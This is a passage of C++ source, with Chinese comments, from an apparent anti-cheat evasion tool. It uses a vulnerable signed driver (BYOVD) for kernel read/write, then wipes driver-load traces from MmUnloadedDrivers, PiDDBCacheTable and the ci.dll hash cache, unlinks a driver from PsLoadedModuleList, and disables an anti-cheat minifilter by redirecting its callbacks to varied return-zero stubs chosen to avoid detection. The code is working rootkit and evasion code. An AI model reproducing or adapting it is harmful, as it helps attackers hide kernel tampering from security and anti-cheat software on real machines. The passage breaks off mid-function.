    // 策略: 扫描 ci.dll 的 .data 段寻找包含 "RTCore64" 字符串的哈希条目

    // ★ v3.126m-review: 修复 — 缩减扫描范围到 3MB (ci.dll 典型大小 < 2MB)
    uint64_t ciDataStart = ciBase + 0x10000;  // ci.dll .data 段大致起始
    uint64_t ciDataEnd = ciBase + 0x300000;    // ci.dll 典型大小 ~1.5MB, 上限 3MB

    int cleared = 0;
    // 逐页扫描 ci.dll 的数据段
    for (uint64_t addr = ciDataStart; addr < ciDataEnd; addr += 0x1000) {
        uint8_t page[0x1000] = {};
        if (!kma.ReadKernelVA(addr, page, sizeof(page)))
            continue;

        // ★ v3.126m-review: 修复 — off 从 8 开始 (防止 page + off - 8 越界读取栈前数据)
        for (size_t off = 8; off < sizeof(page) - 32; off++) {
            // 寻找可能的 Unicode 字符串指针 → 池地址 (高位地址, 不在 ci.dll 模块内)
            uint64_t strPtr = *(uint64_t*)(page + off);
            uint16_t strLen = *(uint16_t*)(page + off - 8);
            uint16_t strMax = *(uint16_t*)(page + off - 6);

            if (strPtr > 0xFFFF800000000000ULL && // 内核池地址范围
                strLen > 0 && strLen <= 256 && strLen <= strMax &&
                strLen % 2 == 0) {

                wchar_t name[256] = {};
                int nchars = ReadKernelUnicodeString(strPtr, strLen, name, 256);
                if (nchars > 0 && IsTraceTarget(name)) {
                    ByovdDiag("TRACE:CiHashBucket: found '%ls' at ci+0x%zX → clearing\n",
                        name, (size_t)(addr + off - 8 - ciBase));
                    // 清零 UNICODE_STRING (16 bytes: Length+MaxLength+Buffer+pad)
                    uint8_t zeros[16] = {};
                    kma.WriteKernelVA(addr + off - 8, zeros, 16);
                    cleared++;
                }
            }
        }
    }

    ByovdDiag("TRACE:CiHashBucket: done, cleared %d entries\n", cleared);
    return (cleared > 0);
    ── v3.128 end ── */
}

// ============================================================
// CleanAllTraces — 一键清理全部痕迹
// ============================================================
bool KernelTraceCleaner::CleanAllTraces() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        ByovdDiag("TRACE:CleanAllTraces: BYOVD not active, skip\n");
        return false;
    }

    // ★ v3.128: PAC 未加载则跳过所有痕迹清理 — 没有反作弊驱动可以检测我们
    // ★ BUILD 550: 解密内核模块名 (原 "MessageTransfer.sys" 明文)
    uint64_t pacBase = 0;
    {
        char mtName[32];
        STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
        pacBase = kma.GetKernelModuleBase(mtName);
        SecureZeroMemory(mtName, sizeof(mtName));
    }
    if (!pacBase) {
        ByovdDiag("TRACE:CleanAllTraces: tgt-driver not loaded, skip all trace cleaning\n");
        return false;
    }

    ByovdDiag("TRACE:CleanAllTraces: === STARTING KERNEL TRACE CLEANUP ===\n");

    uint64_t ntosBase = kma.GetNtoskrnlBase();
    // ★ BUILD 550: 解密内核模块名 (原 "ci.dll" 明文)
    uint64_t ciBase = 0;
    {
        char ciName[16];
        STEALTH_STR_DECRYPT_TO("ci.dll", ciName, sizeof(ciName));
        ciBase = kma.GetKernelModuleBase(ciName);
        SecureZeroMemory(ciName, sizeof(ciName));
    }

    ByovdDiag("TRACE:CleanAllTraces: ntos=0x%llX ci=0x%llX\n",
        (unsigned long long)ntosBase, (unsigned long long)ciBase);

    int successCount = 0;

    // 1. MmUnloadedDrivers — 最容易被检查的表
    if (ClearMmUnloadedDrivers(ntosBase)) {
        successCount++;
    } else {
        ByovdDiag("TRACE:CleanAllTraces: MmUnloadedDrivers — no entries found or cleared\n");
    }

    // 2. PiDDBCacheTable — AVL 树缓存
    if (ClearPiDDBCacheTable(ntosBase)) {
        successCount++;
    } else {
        ByovdDiag("TRACE:CleanAllTraces: PiDDBCacheTable — no entries found or cleared\n");
    }

    // 3. ci.dll KernelHashBucketList — Code Integrity 缓存
    if (ClearCiHashBucket(ciBase)) {
        successCount++;
    } else {
        ByovdDiag("TRACE:CleanAllTraces: CiHashBucket — no entries found or cleared\n");
    }

    ByovdDiag("TRACE:CleanAllTraces: === COMPLETE (%d/3 tables modified) ===\n", successCount);
    return (successCount > 0);
}

// ============================================================
// ★ BUILD 564 (v3.223): PsLoadedModuleHider 实现
//   从 PsLoadedModuleList 链表摘除指定驱动模块的 LDR_DATA_TABLE_ENTRY
//
// LDR_DATA_TABLE_ENTRY 关键偏移 (Win10/11 x64):
//   +0x00  InLoadOrderLinks (LIST_ENTRY: Flink, Blink 各 8 字节)
//   +0x30  DllBase (PVOID)
//   +0x40  SizeOfImage (ULONG)
//   +0x48  FullDllName (UNICODE_STRING: Length, MaxLength, Buffer)
//   +0x58  BaseDllName (UNICODE_STRING: Length, MaxLength, Buffer)
//   +0x60  BaseDllName.Buffer (在 +0x58 偏移内的 +0x08 位置)
//
// PsLoadedModuleList 头节点本身是一个 LIST_ENTRY (16 字节), 不属于任何
// LDR_DATA_TABLE_ENTRY. 链表第一个 entry (头节点的 Flink 指向) 通常是
// ntoskrnl.exe 自身.
// ============================================================

// LDR_DATA_TABLE_ENTRY 偏移常量
static constexpr uint32_t LDR_IN_LOAD_ORDER_LINKS_OFF = 0x00;  // LIST_ENTRY (Flink, Blink)
static constexpr uint32_t LDR_DLLBASE_OFF             = 0x30;  // PVOID
static constexpr uint32_t LDR_BASE_DLL_NAME_OFF       = 0x58;  // UNICODE_STRING (Length, MaxLength, Buffer)
static constexpr uint32_t LDR_BASE_DLL_NAME_BUF_OFF   = 0x60;  // BaseDllName.Buffer (在 LDR_DATA_TABLE_ENTRY 内的偏移)

// LocatePsLoadedModuleList — 扫描 ntoskrnl .data 段定位 PsLoadedModuleList 头节点
//   策略: 验证 5 个条件 (详见头文件注释), 任一失败则跳过候选
uint64_t PsLoadedModuleHider::LocatePsLoadedModuleList(uint64_t ntosBase) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!ntosBase) return 0;

    // 1. 读取 PE 头解析 .data 段
    IMAGE_DOS_HEADER dos = {};
    if (!kma.ReadKernelVA(ntosBase, &dos, sizeof(dos))) {
        ByovdDiag("B564:Loc: FAIL read DOS header\n");
        return 0;
    }
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) {
        ByovdDiag("B564:Loc: FAIL bad DOS magic 0x%04X\n", dos.e_magic);
        return 0;
    }

    IMAGE_NT_HEADERS64 nt = {};
    uint64_t ntHdrVA = ntosBase + dos.e_lfanew;
    if (!kma.ReadKernelVA(ntHdrVA, &nt, sizeof(nt))) {
        ByovdDiag("B564:Loc: FAIL read NT headers\n");
        return 0;
    }
    if (nt.Signature != IMAGE_NT_SIGNATURE) {
        ByovdDiag("B564:Loc: FAIL bad NT signature 0x%08X\n", nt.Signature);
        return 0;
    }

    // 2. 遍历 section headers 找 .data 段
    uint64_t secTableVA = ntHdrVA + sizeof(IMAGE_NT_HEADERS64);
    IMAGE_SECTION_HEADER dataSec = {};
    bool foundData = false;
    constexpr int MAX_SECTIONS = 96;  // 防止异常 PE
    for (int i = 0; i < MAX_SECTIONS; i++) {
        IMAGE_SECTION_HEADER sec = {};
        if (!kma.ReadKernelVA(secTableVA + i * sizeof(IMAGE_SECTION_HEADER),
                              &sec, sizeof(sec))) break;
        if (sec.Name[0] == 0) break;  // section 表结束
        // .data 段名 (8 字节, 不足补 0)
        if (sec.Name[0] == '.' && sec.Name[1] == 'd' && sec.Name[2] == 'a' &&
            sec.Name[3] == 't' && sec.Name[4] == 'a' && sec.Name[5] == 0) {
            dataSec = sec;
            foundData = true;
            break;
        }
    }
    if (!foundData) {
        ByovdDiag("B564:Loc: FAIL .data section not found\n");
        return 0;
    }

    uint64_t dataVA = ntosBase + dataSec.VirtualAddress;
    uint64_t dataSize = dataSec.Misc.VirtualSize;
    if (dataSize > 0x4000000ULL) {  // 64MB 上限 (异常保护)
        ByovdDiag("B564:Loc: FAIL .data size too large 0x%llX\n",
            (unsigned long long)dataSize);
        return 0;
    }
    // 8 字节对齐向上 (LIST_ENTRY 是 8 字节对齐)
    dataSize = (dataSize + 7) & ~7ULL;
    ByovdDiag("B564:Loc: .data @ 0x%llX size=0x%llX\n",
        (unsigned long long)dataVA, (unsigned long long)dataSize);

    // 3. 按 1MB 块读取 .data 段, 扫描候选 LIST_ENTRY
    constexpr uint64_t CHUNK_SIZE = 0x100000;  // 1MB
    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, CHUNK_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!chunk) {
        ByovdDiag("B564:Loc: FAIL VirtualAlloc(%llu) for chunk\n",
            (unsigned long long)CHUNK_SIZE);
        return 0;
    }

    uint64_t found = 0;
    // 缓存 ntoskrnl.exe 的 wchar 比较 (12 chars, 不含 null = 24 字节)
    // ★ BUILD 564: 用 sizeof 编译期常量替代 wcslen (避免运行时 CRT 调用)
    constexpr wchar_t ntosNameW[] = L"ntoskrnl.exe";
    constexpr size_t ntosNameChars = (sizeof(ntosNameW) / sizeof(wchar_t)) - 1;  // 12 (去掉 null)
    constexpr size_t ntosNameBytes = ntosNameChars * 2;  // 24

    // ★ v3.296 FIX-14c: 只用严格白名单 — 非分页池 [0xFFFFFA00, 0xFFFFFC00)
    //   放弃扩展白名单回退 (FIX-14b 的扩展白名单导致蓝屏 — PFN 数据库有未映射页).
    //   蓝屏日志证据: "LocRetry mode=extended_whitelist" 后崩溃.
    //   如果严格白名单找不到 PsLoadedModuleList, 放弃隐藏驱动 (返回 false).
    //   权衡: PsLoadedModuleList 隐藏只降低检测概率 2-4% → 0-1%, 不是关键功能.
    //         蓝屏比检测风险更严重 — 用户无法继续游戏.
    //   排除区域:
    //     - 内核镜像 [0xFFFFF800, 0xFFFFFA00) — 有间隙页 (驱动卸载后未映射)
    //     - 非分页池扩展 [0xFFFF8000, 0xFFFFF680) — PFN 数据库部分未映射
    //     - 系统 PTE [0xFFFFFD00+) — 未映射
    auto isValidListPtr = [](uint64_t va) -> bool {
        if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL) return true;  // 非分页池
        return false;
    };
    auto getUpperBound = [](uint64_t va) -> uint64_t {
        if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL) return 0xFFFFFC0000000000ULL;
        return 0;
    };

    for (uint64_t off = 0; off < dataSize && !found; off += CHUNK_SIZE) {
        uint64_t readSize = CHUNK_SIZE;
        if (off + readSize > dataSize) readSize = dataSize - off;
        if (!kma.ReadKernelVA(dataVA + off, chunk, (size_t)readSize)) {
            ByovdDiag("B564:Loc: ReadKernelVA FAIL @ off=0x%llX\n",
                (unsigned long long)off);
            continue;
        }

        // 8 字节对齐扫描
        for (uint64_t i = 0; i + 16 <= readSize; i += 8) {
            uint64_t flink = *(uint64_t*)(chunk + i);
            uint64_t blink = *(uint64_t*)(chunk + i + 8);

            // 条件 1: Flink/Blink 都在内核非分页池范围
            if (flink <= 0xFFFF800000000000ULL) continue;
            if (blink <= 0xFFFF800000000000ULL) continue;
            // ★ v3.296 FIX-14: 白名单验证 (严格/扩展两步)
            //   排除内核镜像区域 [0xFFFFF800, 0xFFFFFA00) — 有间隙页, 读取不安全
            //   排除系统 PTE [0xFFFFFD00+) — 未映射, 读取蓝屏
            if (!isValidListPtr(flink)) continue;
            if (!isValidListPtr(blink)) continue;
            // 排除指向自身的孤立节点 (PsLoadedModuleList 头节点的 Flink 不会指向自身)
            if (flink == dataVA + off + i) continue;

            // ★ v3.296 FIX-13: 确保 flink + 0x68 (最大读取偏移) 不超过子区域上限
            {
                uint64_t upper = getUpperBound(flink);
                if (upper == 0 || flink + 0x68 > upper) continue;
            }

            uint64_t candidateVA = dataVA + off + i;

            // 条件 2: Flink + 0x30 (DllBase) == ntosBase (第一个模块是 ntoskrnl.exe)
            uint64_t dllBase = kma.Read<uint64_t>(flink + LDR_DLLBASE_OFF);
            if (dllBase != ntosBase) continue;

            // 条件 3: Flink + 0x58 (BaseDllName.Length) == 24
            uint16_t baseNameLen = kma.Read<uint16_t>(flink + LDR_BASE_DLL_NAME_OFF);
            if (baseNameLen != ntosNameBytes) continue;

            // 条件 4: Flink + 0x60 (BaseDllName.Buffer) 指向非分页池
            //   ★ v3.296 FIX-15: 严格白名单验证 baseNameBuf, 排除内核镜像区域 (有间隙页)
            //     原代码只检查 > 0xFFFF8000, 若 baseNameBuf 落在内核镜像间隙页,
            //     ReadKernelVA 允许但 driver memcpy 读取未映射页 → 0x50 蓝屏.
            uint64_t baseNameBuf = kma.Read<uint64_t>(flink + LDR_BASE_DLL_NAME_BUF_OFF);
            if (baseNameBuf < 0xFFFFFA0000000000ULL || baseNameBuf >= 0xFFFFFC0000000000ULL) continue;
            if (baseNameBuf + ntosNameBytes > 0xFFFFFC0000000000ULL) continue;

            // 条件 5: Buffer 内容 == L"ntoskrnl.exe"
            wchar_t readName[16] = {};
            if (!kma.ReadKernelVA(baseNameBuf, readName, ntosNameBytes)) continue;
            // 显式终止
            readName[ntosNameBytes / 2] = 0;
            if (wcsncmp(readName, ntosNameW, ntosNameBytes / 2) != 0) continue;

            // 全部条件满足 — 找到 PsLoadedModuleList 头节点
            found = candidateVA;
            ByovdDiag("B564:Loc: FOUND PsLoadedModuleList @ 0x%llX (off=0x%llX flink=0x%llX blink=0x%llX)\n",
                (unsigned long long)found, (unsigned long long)off,
                (unsigned long long)flink, (unsigned long long)blink);
            break;
        }
    }

    VirtualFree(chunk, 0, MEM_RELEASE);

    if (!found) {
        StateLog("B564", "LocateFail", "reason=no_candidate dataVA=0x%llX dataSize=0x%llX",
                 (unsigned long long)dataVA, (unsigned long long)dataSize);
    }
    return found;
}

// FindEntryByBaseName — 在链表中按 BaseDllName 查找 LDR_DATA_TABLE_ENTRY
uint64_t PsLoadedModuleHider::FindEntryByBaseName(uint64_t listHead, const wchar_t* baseName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!listHead || !baseName) return 0;

    size_t targetLen = wcslen(baseName);
    if (targetLen == 0 || targetLen > 127) return 0;

    uint64_t current = kma.Read<uint64_t>(listHead);  // listHead.Flink
    if (!current) return 0;

    // 终止条件: current == listHead (循环回到头), current == 0, 或超过 512 次迭代
    constexpr int MAX_ITER = 512;
    int iter = 0;
    for (; iter < MAX_ITER; iter++) {
        if (current == listHead || current == 0) break;
        if (current <= 0xFFFF800000000000ULL) break;  // 非内核地址, 异常终止
        // ★ v3.296 FIX-14c: 白名单 (与 LocatePsLoadedModuleList 一致, 严格模式)
        //   只允许非分页池 [0xFFFFFA00, 0xFFFFFC00)
        //   排除内核镜像区域 (有间隙页) 和非分页池扩展 (PFN 可能部分未映射)
        {
            bool validPtr = (current >= 0xFFFFFA0000000000ULL && current < 0xFFFFFC0000000000ULL);
            if (!validPtr) break;
            // ★ v3.296 FIX-13: 确保 current+0x68 不超过非分页池上限
            if (current + 0x68 > 0xFFFFFC0000000000ULL) break;
        }

        // 读取 BaseDllName (UNICODE_STRING @ +0x58)
        uint16_t nameLen = kma.Read<uint16_t>(current + LDR_BASE_DLL_NAME_OFF);
        uint64_t nameBuf = kma.Read<uint64_t>(current + LDR_BASE_DLL_NAME_BUF_OFF);

        // ★ v3.296 FIX-15: 严格白名单验证 nameBuf, 排除内核镜像区域 (有间隙页)
        //   原代码只检查 > 0xFFFF8000, 若 nameBuf 落在内核镜像间隙页,
        //   ReadKernelVA 允许但 driver memcpy 读取未映射页 → 0x50 蓝屏.
        if (nameLen > 0 && nameLen <= 256 &&
            nameBuf >= 0xFFFFFA0000000000ULL && nameBuf < 0xFFFFFC0000000000ULL) {
            uint16_t chars = nameLen / 2;
            wchar_t readName[128] = {};
            uint16_t readChars = chars < 127 ? chars : 127;
            // ★ FIX-15: 确保 nameBuf + readChars*2 不超过非分页池上限
            if (nameBuf + (uint64_t)readChars * 2 > 0xFFFFFC0000000000ULL) goto nextNode;
            if (kma.ReadKernelVA(nameBuf, readName, readChars * 2)) {
                readName[readChars] = 0;
                // 不区分大小写比较 (wcsicmp 在 manual-mapped DLL 中可能不可用, 用 _wcsicmp)
                if (_wcsicmp(readName, baseName) == 0) {
                    ByovdDiag("B564:Find: matched '%ls' @ 0x%llX (iter=%d)\n",
                        baseName, (unsigned long long)current, iter);
                    return current;
                }
            }
        }

    nextNode:
        // 下一个节点
        uint64_t next = kma.Read<uint64_t>(current);  // current.Flink
        if (next == current) break;  // 自循环 (避免死循环)
        current = next;
    }

    // ★ v3.295: 添加 StateLog 诊断查找失败
    StateLog("B564", "FindFail", "target='%ls' iter=%d current=0x%llX",
             baseName, iter, (unsigned long long)current);
    return 0;
}

// PerformUnlink — DKOM 断链 + SelfLoopHarden
bool PsLoadedModuleHider::PerformUnlink(uint64_t entryAddr, uint64_t listHead) {
    auto& kma = KernelMemoryAccessor::Instance();
    (void)listHead;  // 当前实现未使用 listHead (断链只需 prev/next)

    // ★ v3.296 FIX-15: 验证 entryAddr 和 entryAddr+8 在非分页池白名单内
    //   (FindEntryByBaseName 已验证 current+0x68, 但深度防御)
    if (entryAddr < 0xFFFFFA0000000000ULL || entryAddr + 16 > 0xFFFFFC0000000000ULL) {
        ByovdDiag("B564:Unlink: FAIL entryAddr outside whitelist\n");
        return false;
    }

    // 1. 读 current 的 Flink/Blink (InLoadOrderLinks)
    uint64_t curFlink = kma.Read<uint64_t>(entryAddr);       // current.Flink
    uint64_t curBlink = kma.Read<uint64_t>(entryAddr + 8);   // current.Blink

    ByovdDiag("B564:Unlink: entry=0x%llX flink=0x%llX blink=0x%llX\n",
        (unsigned long long)entryAddr,
        (unsigned long long)curFlink, (unsigned long long)curBlink);

    // 验证: Flink/Blink 必须是内核地址, 不能指向自身 (除非已断链)
    if (curFlink <= 0xFFFF800000000000ULL || curBlink <= 0xFFFF800000000000ULL) {
        ByovdDiag("B564:Unlink: FAIL invalid links (flink/blink not in kernel)\n");
        return false;
    }
    // ★ v3.296 FIX-14c: Flink/Blink 必须在非分页池白名单内 (严格模式)
    //   (与 LocatePsLoadedModuleList/FindEntryByBaseName 一致)
    {
        auto isValidListPtr = [](uint64_t va) -> bool {
            if (va >= 0xFFFFFA0000000000ULL && va < 0xFFFFFC0000000000ULL) return true;  // 非分页池
            return false;
        };
        if (!isValidListPtr(curFlink) || !isValidListPtr(curBlink)) {
            ByovdDiag("B564:Unlink: FAIL flink/blink outside whitelist\n");
            return false;
        }
        // ★ v3.296 FIX-15: 确保 curFlink+8 和 curBlink+8 也在非分页池内
        //   (写入操作需要写入这些地址, 若超过上限会写入分页池/系统 PTE → 蓝屏)
        if (curFlink + 8 >= 0xFFFFFC0000000000ULL || curBlink + 8 >= 0xFFFFFC0000000000ULL) {
            ByovdDiag("B564:Unlink: FAIL flink/blink+8 outside whitelist\n");
            return false;
        }
    }
    if (curFlink == entryAddr && curBlink == entryAddr) {
        ByovdDiag("B564:Unlink: entry already self-loop (may be already hidden)\n");
        // 已自循环 = 可能已被隐藏, 视为成功 (幂等)
        return true;
    }
    if (curFlink == entryAddr || curBlink == entryAddr) {
        ByovdDiag("B564:Unlink: FAIL partial self-loop (corrupted entry)\n");
        return false;
    }

    // 2. 写 prev.Flink = next, next.Blink = prev (断链)
    //    prev = curBlink, next = curFlink
    bool w1 = kma.Write(curBlink, curFlink);              // prev.Flink = next
    bool w2 = kma.Write(curFlink + 8, curBlink);          // next.Blink = prev

    if (!w1 || !w2) {
        ByovdDiag("B564:Unlink: Write FAILED w1=%d w2=%d — rolling back\n",
            w1?1:0, w2?1:0);
        // 回滚: 恢复 prev.Flink=&current, next.Blink=&current
        // (恢复链表完整性, 避免半断链状态)
        if (w1) kma.Write(curBlink, entryAddr);            // 撤销 prev.Flink = next
        if (w2) kma.Write(curFlink + 8, entryAddr);        // 撤销 next.Blink = prev
        return false;
    }

    // 3. SelfLoopHarden: current.Flink=&current, current.Blink=&current (防 0x139)
    //    参考 DKOMProcessHider::SelfLoopHarden (BUILD 558 FIX)
    //    原理: RemoveEntryList(&current) 检查 current.Flink->Blink == current,
    //          自循环使 current.Blink = &current, current.Flink->Blink = current.Blink = &current,
    //          即 (&current)->Blink == current → current == current ✓
    bool w3 = kma.Write(entryAddr, entryAddr);            // current.Flink = &current
    bool w4 = kma.Write(entryAddr + 8, entryAddr);        // current.Blink = &current

    if (!w3 || !w4) {
        // ★ BUILD 564 深度防御: SelfLoopHarden 失败时回滚断链
        //   原因: 若不回滚, current.Flink/Blink 保留旧值 (指向 prev/next),
        //         而 prev.Flink=next, next.Blink=prev 已断链.
        //         若后续 RemoveEntryList(&current) 被调用 (理论上 PDFWKRNL 永不
        //         卸载不会触发, 但深度防御), 检查 current.Flink->Blink == current
        //         → next.Blink == current → prev == current → FALSE → 0x139.
        //   回滚: 恢复 prev.Flink=&current, next.Blink=&current (current 重新链入)
        ByovdDiag("B564:Unlink: SelfLoopHarden FAIL w3=%d w4=%d — rolling back unlink\n",
            w3?1:0, w4?1:0);
        kma.Write(curBlink, entryAddr);            // prev.Flink = &current (恢复)
        kma.Write(curFlink + 8, entryAddr);        // next.Blink = &current (恢复)
        return false;
    }

    ByovdDiag("B564:Unlink: SUCCESS w1=%d w2=%d w3=%d w4=%d (prev=0x%llX next=0x%llX)\n",
        w1?1:0, w2?1:0, w3?1:0, w4?1:0,
        (unsigned long long)curBlink, (unsigned long long)curFlink);

    return (w1 && w2 && w3 && w4);
}

// HideDriver — 主入口: 定位 + 查找 + 断链
bool PsLoadedModuleHider::HideDriver(const wchar_t* driverBaseName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        StateLog("B564", "HideFail", "reason=kma_not_active");
        return false;
    }
    if (!driverBaseName) {
        StateLog("B564", "HideFail", "reason=driverBaseName_null");
        return false;
    }

    uint64_t ntosBase = kma.GetNtoskrnlBase();
    if (!ntosBase) {
        StateLog("B564", "HideFail", "reason=ntosBase_zero");
        return false;
    }
    // ★ v3.296 FIX-14: 添加 StateLog 诊断到每个步骤, 精确定位蓝屏崩溃点
    StateLog("B564", "HideStep", "step=1_locate ntosBase=0x%llX",
             (unsigned long long)ntosBase);

    // 1. 定位 PsLoadedModuleList 头节点
    uint64_t listHead = LocatePsLoadedModuleList(ntosBase);
    if (!listHead) {
        StateLog("B564", "HideFail", "reason=locate_failed ntosBase=0x%llX",
                 (unsigned long long)ntosBase);
        return false;
    }
    StateLog("B564", "HideStep", "step=2_find listHead=0x%llX",
             (unsigned long long)listHead);

    // 2. 查找目标驱动条目
    uint64_t entry = FindEntryByBaseName(listHead, driverBaseName);
    if (!entry) {
        StateLog("B564", "HideFail", "reason=entry_not_found listHead=0x%llX",
                 (unsigned long long)listHead);
        return false;
    }

    StateLog("B564", "HideStep", "step=3_unlink entry=0x%llX",
             (unsigned long long)entry);

    // 3. DKOM 断链 + SelfLoopHarden
    bool ok = PerformUnlink(entry, listHead);
    StateLog("B564", "HideResult", "ok=%d entry=0x%llX listHead=0x%llX",
             ok ? 1 : 0, (unsigned long long)entry, (unsigned long long)listHead);
    return ok;
}

// ============================================================
// ★ v3.126n: MinifilterNeutralizer — 中和而非卸载 MessageTransfer

// ★ v3.126p: 前向声明 — PAC 模块函数 (实现在 MinifilterNeutralizer 之后)
// ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
// ★ BUILD 563: GetPacTargetName → FillPacTargetName (栈缓冲, 消除 .data 段长明文)
static uint64_t FindPacFilterInKernel(uint64_t fltmgrBase, uint64_t fltGlobals, wchar_t* outName, int outNameChars);
static bool IsPacPattern(const wchar_t* name);
static void FillPacTargetName(wchar_t* buf, size_t bufChars);
//
// 此前方案: FilterUnload → 卸载 minifilter → PAC 客户端检测到缺失
// 新方案:   不卸载, 用 BYOVD 内核 R/W 替换所有操作回调为无害 stub
//           → minifilter 仍出现在 FilterFindFirst 列表中
//           → 所有文件操作回调返回 FLT_PREOP_SUCCESS_NO_CALLBACK(=0)
//           → PAC 平台满意, 但文件扫描完全失效
//
// fltmgr.sys 内部结构遍历:
//   FltGlobals → FrameList → FLTP_FRAME.FilterList
//   → FLT_FILTER.ActiveLink(+0x00) → 下一个 FLT_FILTER
//
// FLT_FILTER 关键字段 (Win10 22H2 / Win11 22H2, x64):
//   +0x008:  Name.UNICODE_STRING (16 bytes)
//           此偏移因版本而异, 使用运行时 sigscan 动态定位
//   +0x2A8:  Operations 指针 (FLT_OPERATION_REGISTRATION*)
//           每个条目 0x20 bytes: MajorFunction(1)+pad(3)+Flags(4)+
//                                PreOp(8)+PostOp(8)+Reserved(8)
//
// Stub 代码: XOR EAX, EAX; RET = {0x33, 0xC0, 0xC3}
//   在 fltmgr.sys 中扫描此特征码, 复用已有指令作为 stub 目标
// ============================================================

// FLT_OPERATION_REGISTRATION 内核实际布局 (x64, 自然对齐)
struct KernFltOpReg {
    uint8_t  MajorFunction;   // +0x00 IRP_MJ_*
    uint8_t  _pad[3];         // +0x01
    uint32_t Flags;           // +0x04
    uint64_t PreOperation;    // +0x08
    uint64_t PostOperation;   // +0x10
    uint64_t Reserved1;       // +0x18
}; // sizeof = 0x20

// FLT_FILTER 简化布局 — 运行时不需要完整结构体
//   关键偏移通过 sigscan 动态检测, 不硬编码

// Stub 代码: return 0 (FLT_PREOP_SUCCESS_NO_CALLBACK / FLT_POSTOP_FINISHED_PROCESSING)
#define STUB_RET0_BYTES {0x33, 0xC0, 0xC3}  // XOR EAX, EAX; RET

// ★ BUILD 555 P2-3: 多样化 stub 模式 (修复原单一 stub 易被 PAC 特征码扫描定位的缺陷)
//   原 FindRet0Stub 只扫描 1 种 stub (33 C0 C3), 所有 minifilter 回调都指向同一地址
//   → PAC 扫描 fltmgr.sys 找到该 stub 地址, 再扫描 minifilter Operations 数组发现
//     所有 PreOp/PostOp 都指向同一 stub → 检测到 MinifilterNeutralizer
//   修复: 扫描 5 种等价 "return 0" 模式, 不同回调轮流使用不同 stub 地址
//   5 种模式 (语义等价: 返回 0):
//     Pattern A: 33 C0 C3            (XOR EAX, EAX; RET)         - 3 字节
//     Pattern B: B8 00 00 00 00 C3   (MOV EAX, 0; RET)           - 6 字节
//     Pattern C: 2B C0 C3            (SUB EAX, EAX; RET)         - 3 字节
//     Pattern D: 83 E0 00 C3         (AND EAX, 0; RET)           - 4 字节
//     Pattern E: 6A 00 58 C3         (PUSH 0; POP RAX; RET)      - 4 字节

// 5 种等价 stub 模式 (运行时构建, 避免明文模式常量被 PAC 扫描)
static const uint8_t STUB_PATTERNS_RAW[][6] = {
    {0x33, 0xC0, 0xC3},                       // A: XOR EAX, EAX; RET
    {0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3},     // B: MOV EAX, 0; RET
    {0x2B, 0xC0, 0xC3},                       // C: SUB EAX, EAX; RET
    {0x83, 0xE0, 0x00, 0xC3},                 // D: AND EAX, 0; RET
    {0x6A, 0x00, 0x58, 0xC3},                 // E: PUSH 0; POP RAX; RET
};
static const size_t STUB_PATTERN_LENS[] = {3, 6, 3, 4, 4};
static constexpr size_t STUB_PATTERN_COUNT = 5;
static constexpr size_t MAX_STUB_INSTANCES = 16;  // 最多收集 16 个 stub 实例

// ★ BUILD 555 P2-3: FindRet0Stubs — 扫描 fltmgr.sys 找多种 return 0 stub 实例
//   返回: stub 地址数组 (去重, 最多 maxStubs 个), 实际数量通过 outCount 返回
//   策略: 轮流扫描 5 种模式, 每种模式找到 1 个实例后切换到下一种, 直到收集够 maxStubs 个
//         这样 stub 列表中的模式分布均匀, 避免单一模式主导
// ★ BUILD 567 v3.296: 添加 stub 缓存 — GuardPac 每 30-45s 调用 IsMessageTransferNeutralized,
//   每次重新扫描 fltmgr 代码段 = 数百次 IOCTL, 5分钟累积接近卡死阈值.
//   stub 地址在 fltmgr.sys 加载后不变, 安全缓存.
static uint64_t s_cachedStubs[MAX_STUB_INSTANCES] = {};
static size_t s_cachedStubCount = 0;
static uint64_t s_cachedStubFltBase = 0;

static uint64_t FindRet0Stubs(uint64_t fltmgrBase, uint64_t fltmgrSize,
                               uint64_t* outStubs, size_t maxStubs, size_t* outCount) {
    auto& kma = KernelMemoryAccessor::Instance();
    *outCount = 0;
    if (!outStubs || maxStubs == 0) return 0;

    // ★ v3.296: 缓存命中检查 — fltmgrBase 匹配且缓存有效时直接返回
    if (s_cachedStubCount > 0 && s_cachedStubFltBase == fltmgrBase) {
        size_t copyCount = (s_cachedStubCount < maxStubs) ? s_cachedStubCount : maxStubs;
        for (size_t i = 0; i < copyCount; i++) outStubs[i] = s_cachedStubs[i];
        *outCount = copyCount;
        return outStubs[0];
    }

    uint64_t scanStart = fltmgrBase + 0x1000;
    uint64_t scanEnd = scanStart + (fltmgrSize > 0x300000 ? 0x300000 : fltmgrSize - 0x1000);

    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, 0x10000, MEM_COMMIT, PAGE_READWRITE);
    if (!chunk) return 0;

    // 标记已收集的 stub 地址 (去重)
    uint64_t collected[MAX_STUB_INSTANCES] = {};
    size_t collectedCount = 0;

    // 每种模式是否已找到至少 1 个实例
    bool patternFound[STUB_PATTERN_COUNT] = {};

    // 多轮扫描: 每轮扫描整个 fltmgr, 找一种新模式或同模式新实例
    //   直到收集够 maxStubs 个, 或所有模式都至少找到 1 个且总数 >= maxStubs
    for (size_t round = 0; round < STUB_PATTERN_COUNT * 4 && collectedCount < maxStubs; round++) {
        size_t targetPatternIdx = round % STUB_PATTERN_COUNT;

        for (uint64_t addr = scanStart; addr < scanEnd && collectedCount < maxStubs; addr += 0x10000) {
            if (!kma.ReadKernelVA(addr, chunk, 0x10000))
                continue;

            const uint8_t* pattern = STUB_PATTERNS_RAW[targetPatternIdx];
            size_t patLen = STUB_PATTERN_LENS[targetPatternIdx];

            for (size_t off = 0; off + patLen <= 0x10000; off++) {
                bool match = true;
                for (size_t j = 0; j < patLen; j++) {
